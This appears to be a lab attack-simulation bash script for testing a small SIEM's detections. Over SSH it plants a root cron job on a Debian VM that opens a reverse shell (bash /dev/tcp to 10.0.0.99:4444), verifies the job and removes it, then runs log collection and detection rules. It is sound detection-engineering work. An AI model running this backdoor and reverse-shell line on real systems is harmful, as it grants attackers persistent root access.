#!/usr/bin/env bash
# ==============================================================================
# Attack Scenario 2: Linux VM Persistence & Reverse Shell Command Execution
# MITRE ATT&CK: T1053.003 (Cron Persistence), T1059.004 (Unix Shell)
# Asset Target: Linux Virtual Machine (debianvm)
#
# Execution:
#  1. Injects a persistent backdoor cron job into /etc/cron.d/sync_backdoor.
#  2. Simulates interactive reverse shell spawn via network socket redirection.
#  3. Triggers auditd rule (key="cron_persistence") and process execution log.
#  4. Automatically cleans up injected cron file.
# ==============================================================================

set -euo pipefail

TARGET_HOST="${1:-debianvm}"

echo "======================================================================"
echo "[*] Launching Attack Scenario 2: Persistence & Reverse Shell on ${TARGET_HOST}"
echo "[*] MITRE ATT&CK: T1053.003 (Cron), T1059.004 (Unix Shell)"
echo "======================================================================"

echo "[+] Step 1: Injecting backdoor cron persistence in /etc/cron.d/sync_backdoor..."
ssh "${TARGET_HOST}" 'echo "* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/10.0.0.99/4444 0>&1\"" | sudo tee /etc/cron.d/sync_backdoor > /dev/null'

echo "[+] Step 2: Simulating interactive reverse shell socket execution..."
ssh "${TARGET_HOST}" 'timeout 2 /bin/bash -c "cat < /dev/null > /dev/tcp/10.0.0.99/4444" 2>&1 || true'

echo "[+] Step 3: Verifying persistence entry in /etc/cron.d/..."
ssh "${TARGET_HOST}" 'ls -la /etc/cron.d/sync_backdoor && cat /etc/cron.d/sync_backdoor'

echo "[+] Step 4: Cleaning up persistence backdoor from ${TARGET_HOST}..."
ssh "${TARGET_HOST}" 'sudo rm -f /etc/cron.d/sync_backdoor'

echo "[+] Step 5: Forwarding Debian VM audit telemetry to Mini SIEM Ingestion Gateway..."
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
"${REPO_DIR}/.venv/bin/python" "${REPO_DIR}/assets/vm/collector.py" --ssh-host 172.16.151.134 --ssh-user aparichit || python3 "${REPO_DIR}/assets/vm/collector.py" || true

echo "[+] Step 6: Triggering Detection Engine to evaluate rules against ClickHouse..."
"${REPO_DIR}/.venv/bin/python" "${REPO_DIR}/detections/engine.py" --once --lookback 60 || python3 "${REPO_DIR}/detections/engine.py" --once --lookback 60 || true

echo "[+] Attack Scenario 2 completed and cleaned up successfully."
